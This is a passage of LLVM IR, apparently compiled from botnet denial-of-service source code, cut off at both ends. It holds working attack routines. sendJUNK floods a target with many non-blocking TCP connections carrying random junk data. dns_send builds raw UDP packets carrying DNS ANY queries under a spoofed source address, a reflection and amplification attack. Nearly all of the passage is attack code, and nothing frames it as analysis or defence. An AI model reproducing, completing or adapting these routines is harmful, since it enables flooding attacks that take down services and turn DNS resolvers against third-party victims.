  %219 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %220 = load i32, i32* %8, align 4
  %221 = sext i32 %220 to i64
  %222 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %221
  %223 = getelementptr inbounds %struct.state_t, %struct.state_t* %222, i32 0, i32 0
  %224 = load i32, i32* %223, align 8
  %225 = sdiv i32 %224, 64
  %226 = sext i32 %225 to i64
  %227 = getelementptr inbounds [16 x i64], [16 x i64]* %219, i64 0, i64 %226
  %228 = load i64, i64* %227, align 8
  %229 = or i64 %228, %218
  store i64 %229, i64* %227, align 8
  %230 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %230, align 8
  %231 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %231, align 8
  %232 = load i32, i32* %8, align 4
  %233 = sext i32 %232 to i64
  %234 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %233
  %235 = getelementptr inbounds %struct.state_t, %struct.state_t* %234, i32 0, i32 0
  %236 = load i32, i32* %235, align 8
  %237 = add nsw i32 %236, 1
  %238 = call i32 @select(i32 %237, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.timeval* %12)
  store i32 %238, i32* %15, align 4
  %239 = load i32, i32* %15, align 4
  %240 = icmp ne i32 %239, 0
  br i1 %240, label %241, label %252

; <label>:241:                                    ; preds = %210
  %242 = load i32, i32* %8, align 4
  %243 = sext i32 %242 to i64
  %244 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %243
  %245 = getelementptr inbounds %struct.state_t, %struct.state_t* %244, i32 0, i32 0
  %246 = load i32, i32* %245, align 8
  %247 = call i32 @close(i32 %246)
  %248 = load i32, i32* %8, align 4
  %249 = sext i32 %248 to i64
  %250 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %249
  %251 = getelementptr inbounds %struct.state_t, %struct.state_t* %250, i32 0, i32 1
  store i8 0, i8* %251, align 4
  br label %252

; <label>:252:                                    ; preds = %241, %210
  br label %253

; <label>:253:                                    ; preds = %252, %198, %113, %60
  br label %254

; <label>:254:                                    ; preds = %253
  %255 = load i32, i32* %8, align 4
  %256 = add nsw i32 %255, 1
  store i32 %256, i32* %8, align 4
  br label %56

; <label>:257:                                    ; preds = %56
  br label %50

; <label>:258:                                    ; preds = %50
  %259 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %259)
  br label %260

; <label>:260:                                    ; preds = %258, %33
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @realrand(i32, i32) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i32 %1, i32* %4, align 4
  %5 = call i64 @time(i64* null) #2
  %6 = call i32 @getpid() #2
  %7 = sext i32 %6 to i64
  %8 = add nsw i64 %5, %7
  %9 = trunc i64 %8 to i32
  call void @srand(i32 %9) #2
  %10 = call i32 @rand() #2
  %11 = load i32, i32* %4, align 4
  %12 = add nsw i32 %11, 1
  %13 = load i32, i32* %3, align 4
  %14 = sub nsw i32 %12, %13
  %15 = srem i32 %10, %14
  %16 = load i32, i32* %3, align 4
  %17 = add nsw i32 %15, %16
  ret i32 %17
}

; Function Attrs: nounwind
declare i32 @getpid() #4

; Function Attrs: noinline nounwind uwtable
define void @makeRandomShit(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %6 = call i64 @time(i64* null) #2
  %7 = trunc i64 %6 to i32
  call void @srand(i32 %7) #2
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %8

; <label>:8:                                      ; preds = %21, %2
  %9 = load i32, i32* %5, align 4
  %10 = load i32, i32* %4, align 4
  %11 = icmp slt i32 %9, %10
  br i1 %11, label %12, label %24

; <label>:12:                                     ; preds = %8
  %13 = call i32 @rand() #2
  %14 = srem i32 %13, 255
  %15 = add nsw i32 %14, 1
  %16 = trunc i32 %15 to i8
  %17 = load i8*, i8** %3, align 8
  %18 = load i32, i32* %5, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  store i8 %16, i8* %20, align 1
  br label %21

; <label>:21:                                     ; preds = %12
  %22 = load i32, i32* %5, align 4
  %23 = add nsw i32 %22, 1
  store i32 %23, i32* %5, align 4
  br label %8

; <label>:24:                                     ; preds = %8
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @sendJUNK(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i8*, align 8
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %22 = call i32 @getdtablesize() #2
  %23 = sdiv i32 %22, 2
  store i32 %23, i32* %7, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = load i32, i32* %5, align 4
  %26 = trunc i32 %25 to i16
  %27 = call zeroext i16 @htons(i16 zeroext %26) #13
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %27, i16* %28, align 2
  %29 = load i8*, i8** %4, align 8
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %31 = call i32 @getHost(i8* %29, %struct.in_addr* %30)
  %32 = icmp ne i32 %31, 0
  br i1 %32, label %33, label %34

; <label>:33:                                     ; preds = %3
  br label %238

; <label>:34:                                     ; preds = %3
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %36 = getelementptr inbounds [8 x i8], [8 x i8]* %35, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %36, i8 0, i64 8, i32 4, i1 false)
  %37 = load i32, i32* %7, align 4
  %38 = zext i32 %37 to i64
  %39 = call i8* @llvm.stacksave()
  store i8* %39, i8** %10, align 8
  %40 = alloca %struct.state_t, i64 %38, align 16
  %41 = bitcast %struct.state_t* %40 to i8*
  %42 = load i32, i32* %7, align 4
  %43 = sext i32 %42 to i64
  %44 = mul i64 %43, 5
  call void @llvm.memset.p0i8.i64(i8* %41, i8 0, i64 %44, i32 16, i1 false)
  %45 = call noalias i8* @malloc(i64 1024) #2
  store i8* %45, i8** %16, align 8
  %46 = load i8*, i8** %16, align 8
  call void @llvm.memset.p0i8.i64(i8* %46, i8 0, i64 1024, i32 1, i1 false)
  store i32 1024, i32* %17, align 4
  %47 = call i64 @time(i64* null) #2
  %48 = load i32, i32* %6, align 4
  %49 = sext i32 %48 to i64
  %50 = add nsw i64 %47, %49
  %51 = trunc i64 %50 to i32
  store i32 %51, i32* %18, align 4
  br label %52

; <label>:52:                                     ; preds = %235, %34
  %53 = load i32, i32* %18, align 4
  %54 = sext i32 %53 to i64
  %55 = call i64 @time(i64* null) #2
  %56 = icmp sgt i64 %54, %55
  br i1 %56, label %57, label %236

; <label>:57:                                     ; preds = %52
  store i32 0, i32* %8, align 4
  br label %58

; <label>:58:                                     ; preds = %232, %57
  %59 = load i32, i32* %8, align 4
  %60 = load i32, i32* %7, align 4
  %61 = icmp slt i32 %59, %60
  br i1 %61, label %62, label %235

; <label>:62:                                     ; preds = %58
  %63 = load i32, i32* %8, align 4
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %64
  %66 = getelementptr inbounds %struct.state_t, %struct.state_t* %65, i32 0, i32 1
  %67 = load i8, i8* %66, align 4
  %68 = zext i8 %67 to i32
  switch i32 %68, label %231 [
    i32 0, label %69
    i32 1, label %116
    i32 2, label %201
  ]

; <label>:69:                                     ; preds = %62
  %70 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %71 = load i32, i32* %8, align 4
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %72
  %74 = getelementptr inbounds %struct.state_t, %struct.state_t* %73, i32 0, i32 0
  store i32 %70, i32* %74, align 8
  %75 = load i32, i32* %8, align 4
  %76 = sext i32 %75 to i64
  %77 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %76
  %78 = getelementptr inbounds %struct.state_t, %struct.state_t* %77, i32 0, i32 0
  %79 = load i32, i32* %78, align 8
  %80 = load i32, i32* %8, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %81
  %83 = getelementptr inbounds %struct.state_t, %struct.state_t* %82, i32 0, i32 0
  %84 = load i32, i32* %83, align 8
  %85 = call i32 (i32, i32, ...) @fcntl(i32 %84, i32 3, i8* null)
  %86 = or i32 %85, 2048
  %87 = call i32 (i32, i32, ...) @fcntl(i32 %79, i32 4, i32 %86)
  %88 = load i32, i32* %8, align 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %89
  %91 = getelementptr inbounds %struct.state_t, %struct.state_t* %90, i32 0, i32 0
  %92 = load i32, i32* %91, align 8
  %93 = bitcast %union.__CONST_SOCKADDR_ARG* %19 to %struct.sockaddr**
  %94 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  store %struct.sockaddr* %94, %struct.sockaddr** %93, align 8
  %95 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %19, i32 0, i32 0
  %96 = load %struct.sockaddr*, %struct.sockaddr** %95, align 8
  %97 = call i32 @connect(i32 %92, %struct.sockaddr* %96, i32 16)
  %98 = icmp ne i32 %97, -1
  br i1 %98, label %103, label %99

; <label>:99:                                     ; preds = %69
  %100 = call i32* @__errno_location() #13
  %101 = load i32, i32* %100, align 4
  %102 = icmp ne i32 %101, 115
  br i1 %102, label %103, label %110

; <label>:103:                                    ; preds = %99, %69
  %104 = load i32, i32* %8, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %105
  %107 = getelementptr inbounds %struct.state_t, %struct.state_t* %106, i32 0, i32 0
  %108 = load i32, i32* %107, align 8
  %109 = call i32 @close(i32 %108)
  br label %115

; <label>:110:                                    ; preds = %99
  %111 = load i32, i32* %8, align 4
  %112 = sext i32 %111 to i64
  %113 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %112
  %114 = getelementptr inbounds %struct.state_t, %struct.state_t* %113, i32 0, i32 1
  store i8 1, i8* %114, align 4
  br label %115

; <label>:115:                                    ; preds = %110, %103
  br label %231

; <label>:116:                                    ; preds = %62
  br label %117

; <label>:117:                                    ; preds = %116
  %118 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %119 = getelementptr inbounds [16 x i64], [16 x i64]* %118, i64 0, i64 0
  %120 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %119) #2, !srcloc !9
  %121 = extractvalue { i64, i64* } %120, 0
  %122 = extractvalue { i64, i64* } %120, 1
  %123 = trunc i64 %121 to i32
  store i32 %123, i32* %20, align 4
  %124 = ptrtoint i64* %122 to i64
  %125 = trunc i64 %124 to i32
  store i32 %125, i32* %21, align 4
  br label %126

; <label>:126:                                    ; preds = %117
  br label %127

; <label>:127:                                    ; preds = %126
  %128 = load i32, i32* %8, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %129
  %131 = getelementptr inbounds %struct.state_t, %struct.state_t* %130, i32 0, i32 0
  %132 = load i32, i32* %131, align 8
  %133 = srem i32 %132, 64
  %134 = zext i32 %133 to i64
  %135 = shl i64 1, %134
  %136 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %137 = load i32, i32* %8, align 4
  %138 = sext i32 %137 to i64
  %139 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %138
  %140 = getelementptr inbounds %struct.state_t, %struct.state_t* %139, i32 0, i32 0
  %141 = load i32, i32* %140, align 8
  %142 = sdiv i32 %141, 64
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds [16 x i64], [16 x i64]* %136, i64 0, i64 %143
  %145 = load i64, i64* %144, align 8
  %146 = or i64 %145, %135
  store i64 %146, i64* %144, align 8
  %147 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %147, align 8
  %148 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %148, align 8
  %149 = load i32, i32* %8, align 4
  %150 = sext i32 %149 to i64
  %151 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %150
  %152 = getelementptr inbounds %struct.state_t, %struct.state_t* %151, i32 0, i32 0
  %153 = load i32, i32* %152, align 8
  %154 = add nsw i32 %153, 1
  %155 = call i32 @select(i32 %154, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  store i32 %155, i32* %15, align 4
  %156 = load i32, i32* %15, align 4
  %157 = icmp eq i32 %156, 1
  br i1 %157, label %158, label %185

; <label>:158:                                    ; preds = %127
  store i32 4, i32* %13, align 4
  %159 = load i32, i32* %8, align 4
  %160 = sext i32 %159 to i64
  %161 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %160
  %162 = getelementptr inbounds %struct.state_t, %struct.state_t* %161, i32 0, i32 0
  %163 = load i32, i32* %162, align 8
  %164 = bitcast i32* %14 to i8*
  %165 = call i32 @getsockopt(i32 %163, i32 1, i32 4, i8* %164, i32* %13) #2
  %166 = load i32, i32* %14, align 4
  %167 = icmp ne i32 %166, 0
  br i1 %167, label %168, label %179

; <label>:168:                                    ; preds = %158
  %169 = load i32, i32* %8, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %170
  %172 = getelementptr inbounds %struct.state_t, %struct.state_t* %171, i32 0, i32 0
  %173 = load i32, i32* %172, align 8
  %174 = call i32 @close(i32 %173)
  %175 = load i32, i32* %8, align 4
  %176 = sext i32 %175 to i64
  %177 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %176
  %178 = getelementptr inbounds %struct.state_t, %struct.state_t* %177, i32 0, i32 1
  store i8 0, i8* %178, align 4
  br label %184

; <label>:179:                                    ; preds = %158
  %180 = load i32, i32* %8, align 4
  %181 = sext i32 %180 to i64
  %182 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %181
  %183 = getelementptr inbounds %struct.state_t, %struct.state_t* %182, i32 0, i32 1
  store i8 2, i8* %183, align 4
  br label %184

; <label>:184:                                    ; preds = %179, %168
  br label %200

; <label>:185:                                    ; preds = %127
  %186 = load i32, i32* %15, align 4
  %187 = icmp eq i32 %186, -1
  br i1 %187, label %188, label %199

; <label>:188:                                    ; preds = %185
  %189 = load i32, i32* %8, align 4
  %190 = sext i32 %189 to i64
  %191 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %190
  %192 = getelementptr inbounds %struct.state_t, %struct.state_t* %191, i32 0, i32 0
  %193 = load i32, i32* %192, align 8
  %194 = call i32 @close(i32 %193)
  %195 = load i32, i32* %8, align 4
  %196 = sext i32 %195 to i64
  %197 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %196
  %198 = getelementptr inbounds %struct.state_t, %struct.state_t* %197, i32 0, i32 1
  store i8 0, i8* %198, align 4
  br label %199

; <label>:199:                                    ; preds = %188, %185
  br label %200

; <label>:200:                                    ; preds = %199, %184
  br label %231

; <label>:201:                                    ; preds = %62
  %202 = call i32 @realrand(i32 32, i32 1024)
  store i32 %202, i32* %17, align 4
  %203 = load i8*, i8** %16, align 8
  %204 = load i32, i32* %17, align 4
  call void @makeRandomShit(i8* %203, i32 %204)
  %205 = load i32, i32* %8, align 4
  %206 = sext i32 %205 to i64
  %207 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %206
  %208 = getelementptr inbounds %struct.state_t, %struct.state_t* %207, i32 0, i32 0
  %209 = load i32, i32* %208, align 8
  %210 = load i8*, i8** %16, align 8
  %211 = load i32, i32* %17, align 4
  %212 = sext i32 %211 to i64
  %213 = call i64 @send(i32 %209, i8* %210, i64 %212, i32 16384)
  %214 = icmp eq i64 %213, -1
  br i1 %214, label %215, label %230

; <label>:215:                                    ; preds = %201
  %216 = call i32* @__errno_location() #13
  %217 = load i32, i32* %216, align 4
  %218 = icmp ne i32 %217, 11
  br i1 %218, label %219, label %230

; <label>:219:                                    ; preds = %215
  %220 = load i32, i32* %8, align 4
  %221 = sext i32 %220 to i64
  %222 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %221
  %223 = getelementptr inbounds %struct.state_t, %struct.state_t* %222, i32 0, i32 0
  %224 = load i32, i32* %223, align 8
  %225 = call i32 @close(i32 %224)
  %226 = load i32, i32* %8, align 4
  %227 = sext i32 %226 to i64
  %228 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %227
  %229 = getelementptr inbounds %struct.state_t, %struct.state_t* %228, i32 0, i32 1
  store i8 0, i8* %229, align 4
  br label %230

; <label>:230:                                    ; preds = %219, %215, %201
  br label %231

; <label>:231:                                    ; preds = %230, %200, %115, %62
  br label %232

; <label>:232:                                    ; preds = %231
  %233 = load i32, i32* %8, align 4
  %234 = add nsw i32 %233, 1
  store i32 %234, i32* %8, align 4
  br label %58

; <label>:235:                                    ; preds = %58
  br label %52

; <label>:236:                                    ; preds = %52
  %237 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %237)
  br label %238

; <label>:238:                                    ; preds = %236, %33
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @dns_format(i8*, i8*) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  store i32 0, i32* %5, align 4
  %7 = load i8*, i8** %4, align 8
  %8 = call i8* @strcat(i8* %7, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.417, i32 0, i32 0)) #2
  store i32 0, i32* %6, align 4
  br label %9

; <label>:9:                                      ; preds = %49, %2
  %10 = load i32, i32* %6, align 4
  %11 = sext i32 %10 to i64
  %12 = load i8*, i8** %4, align 8
  %13 = call i64 @strlen(i8* %12) #10
  %14 = icmp ult i64 %11, %13
  br i1 %14, label %15, label %52

; <label>:15:                                     ; preds = %9
  %16 = load i8*, i8** %4, align 8
  %17 = load i32, i32* %6, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds i8, i8* %16, i64 %18
  %20 = load i8, i8* %19, align 1
  %21 = zext i8 %20 to i32
  %22 = icmp eq i32 %21, 46
  br i1 %22, label %23, label %48

; <label>:23:                                     ; preds = %15
  %24 = load i32, i32* %6, align 4
  %25 = load i32, i32* %5, align 4
  %26 = sub nsw i32 %24, %25
  %27 = trunc i32 %26 to i8
  %28 = load i8*, i8** %3, align 8
  %29 = getelementptr inbounds i8, i8* %28, i32 1
  store i8* %29, i8** %3, align 8
  store i8 %27, i8* %28, align 1
  br label %30

; <label>:30:                                     ; preds = %42, %23
  %31 = load i32, i32* %5, align 4
  %32 = load i32, i32* %6, align 4
  %33 = icmp slt i32 %31, %32
  br i1 %33, label %34, label %45

; <label>:34:                                     ; preds = %30
  %35 = load i8*, i8** %4, align 8
  %36 = load i32, i32* %5, align 4
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds i8, i8* %35, i64 %37
  %39 = load i8, i8* %38, align 1
  %40 = load i8*, i8** %3, align 8
  %41 = getelementptr inbounds i8, i8* %40, i32 1
  store i8* %41, i8** %3, align 8
  store i8 %39, i8* %40, align 1
  br label %42

; <label>:42:                                     ; preds = %34
  %43 = load i32, i32* %5, align 4
  %44 = add nsw i32 %43, 1
  store i32 %44, i32* %5, align 4
  br label %30

; <label>:45:                                     ; preds = %30
  %46 = load i32, i32* %5, align 4
  %47 = add nsw i32 %46, 1
  store i32 %47, i32* %5, align 4
  br label %48

; <label>:48:                                     ; preds = %45, %15
  br label %49

; <label>:49:                                     ; preds = %48
  %50 = load i32, i32* %6, align 4
  %51 = add nsw i32 %50, 1
  store i32 %51, i32* %6, align 4
  br label %9

; <label>:52:                                     ; preds = %9
  %53 = load i8*, i8** %3, align 8
  %54 = getelementptr inbounds i8, i8* %53, i32 1
  store i8* %54, i8** %3, align 8
  store i8 0, i8* %53, align 1
  ret void
}

; Function Attrs: nounwind
declare i8* @strcat(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @dns_hdr_create(%struct.dns_hdr*) #0 {
  %2 = alloca %struct.dns_hdr*, align 8
  store %struct.dns_hdr* %0, %struct.dns_hdr** %2, align 8
  %3 = call i32 @getpid() #2
  %4 = trunc i32 %3 to i16
  %5 = call zeroext i16 @htons(i16 zeroext %4) #13
  %6 = load %struct.dns_hdr*, %struct.dns_hdr** %2, align 8
  %7 = getelementptr inbounds %struct.dns_hdr, %struct.dns_hdr* %6, i32 0, i32 0
  store i16 %5, i16* %7, align 2
  %8 = call zeroext i16 @htons(i16 zeroext 256) #13
  %9 = load %struct.dns_hdr*, %struct.dns_hdr** %2, align 8
  %10 = getelementptr inbounds %struct.dns_hdr, %struct.dns_hdr* %9, i32 0, i32 1
  store i16 %8, i16* %10, align 2
  %11 = call zeroext i16 @htons(i16 zeroext 1) #13
  %12 = load %struct.dns_hdr*, %struct.dns_hdr** %2, align 8
  %13 = getelementptr inbounds %struct.dns_hdr, %struct.dns_hdr* %12, i32 0, i32 2
  store i16 %11, i16* %13, align 2
  %14 = load %struct.dns_hdr*, %struct.dns_hdr** %2, align 8
  %15 = getelementptr inbounds %struct.dns_hdr, %struct.dns_hdr* %14, i32 0, i32 3
  store i16 0, i16* %15, align 2
  %16 = load %struct.dns_hdr*, %struct.dns_hdr** %2, align 8
  %17 = getelementptr inbounds %struct.dns_hdr, %struct.dns_hdr* %16, i32 0, i32 4
  store i16 0, i16* %17, align 2
  %18 = load %struct.dns_hdr*, %struct.dns_hdr** %2, align 8
  %19 = getelementptr inbounds %struct.dns_hdr, %struct.dns_hdr* %18, i32 0, i32 5
  store i16 0, i16* %19, align 2
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @dns_send(i8*, i32, i8*, i8*) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca [128 x i8], align 16
  %10 = alloca %struct.dns_hdr*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca [32 x i8], align 16
  %13 = alloca %struct.query*, align 8
  %14 = alloca [4096 x i8], align 16
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca %struct.sockaddr_in, align 4
  %18 = alloca %struct.iphdr*, align 8
  %19 = alloca %struct.udphdr*, align 8
  %20 = alloca %struct.ps_hdr, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8* %0, i8** %5, align 8
  store i32 %1, i32* %6, align 4
  store i8* %2, i8** %7, align 8
  store i8* %3, i8** %8, align 8
  %24 = bitcast [128 x i8]* %9 to %struct.dns_hdr*
  store %struct.dns_hdr* %24, %struct.dns_hdr** %10, align 8
  %25 = load %struct.dns_hdr*, %struct.dns_hdr** %10, align 8
  call void @dns_hdr_create(%struct.dns_hdr* %25)
  %26 = getelementptr inbounds [128 x i8], [128 x i8]* %9, i64 0, i64 12
  store i8* %26, i8** %11, align 8
  %27 = getelementptr inbounds [32 x i8], [32 x i8]* %12, i32 0, i32 0
  %28 = load i8*, i8** %8, align 8
  %29 = call i8* @strcpy(i8* %27, i8* %28) #2
  %30 = load i8*, i8** %11, align 8
  %31 = getelementptr inbounds [32 x i8], [32 x i8]* %12, i32 0, i32 0
  call void @dns_format(i8* %30, i8* %31)
  %32 = load i8*, i8** %11, align 8
  %33 = call i64 @strlen(i8* %32) #10
  %34 = add i64 %33, 1
  %35 = add i64 12, %34
  %36 = getelementptr inbounds [128 x i8], [128 x i8]* %9, i64 0, i64 %35
  %37 = bitcast i8* %36 to %struct.query*
  store %struct.query* %37, %struct.query** %13, align 8
  %38 = call zeroext i16 @htons(i16 zeroext 255) #13
  %39 = load %struct.query*, %struct.query** %13, align 8
  %40 = getelementptr inbounds %struct.query, %struct.query* %39, i32 0, i32 0
  store i16 %38, i16* %40, align 2
  %41 = call zeroext i16 @htons(i16 zeroext 1) #13
  %42 = load %struct.query*, %struct.query** %13, align 8
  %43 = getelementptr inbounds %struct.query, %struct.query* %42, i32 0, i32 1
  store i16 %41, i16* %43, align 2
  %44 = getelementptr inbounds [4096 x i8], [4096 x i8]* %14, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %44, i8 0, i64 4096, i32 16, i1 false)
  %45 = getelementptr inbounds [4096 x i8], [4096 x i8]* %14, i32 0, i32 0
  %46 = getelementptr inbounds i8, i8* %45, i64 20
  %47 = getelementptr inbounds i8, i8* %46, i64 8
  store i8* %47, i8** %15, align 8
  %48 = load i8*, i8** %15, align 8
  %49 = bitcast [128 x i8]* %9 to i8*
  %50 = load i8*, i8** %11, align 8
  %51 = call i64 @strlen(i8* %50) #10
  %52 = add i64 %51, 1
  %53 = add i64 12, %52
  %54 = add i64 %53, 4
  %55 = add i64 %54, 1
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %48, i8* %49, i64 %55, i32 1, i1 false)
  %56 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 0
  store i16 2, i16* %56, align 4
  %57 = call zeroext i16 @htons(i16 zeroext 53) #13
  %58 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %57, i16* %58, align 2
  %59 = load i8*, i8** %7, align 8
  %60 = call i32 @inet_addr(i8* %59) #2
  %61 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %62 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %61, i32 0, i32 0
  store i32 %60, i32* %62, align 4
  %63 = getelementptr inbounds [4096 x i8], [4096 x i8]* %14, i32 0, i32 0
  %64 = bitcast i8* %63 to %struct.iphdr*
  store %struct.iphdr* %64, %struct.iphdr** %18, align 8
  %65 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %66 = bitcast %struct.iphdr* %65 to i8*
  %67 = load i8, i8* %66, align 4
  %68 = and i8 %67, 15
  %69 = or i8 %68, 64
  store i8 %69, i8* %66, align 4
  %70 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %71 = bitcast %struct.iphdr* %70 to i8*
  %72 = load i8, i8* %71, align 4
  %73 = and i8 %72, -16
  %74 = or i8 %73, 5
  store i8 %74, i8* %71, align 4
  %75 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %76 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %75, i32 0, i32 1
  store i8 0, i8* %76, align 1
  %77 = load i8*, i8** %11, align 8
  %78 = call i64 @strlen(i8* %77) #10
  %79 = add i64 %78, 1
  %80 = add i64 40, %79
  %81 = add i64 %80, 4
  %82 = trunc i64 %81 to i16
  %83 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %84 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %83, i32 0, i32 2
  store i16 %82, i16* %84, align 2
  %85 = call i32 @rand_cmwc()
  %86 = call i32 @htonl(i32 %85) #13
  %87 = trunc i32 %86 to i16
  %88 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %89 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %88, i32 0, i32 3
  store i16 %87, i16* %89, align 4
  %90 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %91 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %90, i32 0, i32 4
  store i16 0, i16* %91, align 2
  %92 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %93 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %92, i32 0, i32 5
  store i8 64, i8* %93, align 4
  %94 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %95 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %94, i32 0, i32 6
  store i8 17, i8* %95, align 1
  %96 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %97 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %96, i32 0, i32 7
  store i16 0, i16* %97, align 2
  %98 = load i8*, i8** %5, align 8
  %99 = call i32 @inet_addr(i8* %98) #2
  %100 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %101 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %100, i32 0, i32 8
  store i32 %99, i32* %101, align 4
  %102 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
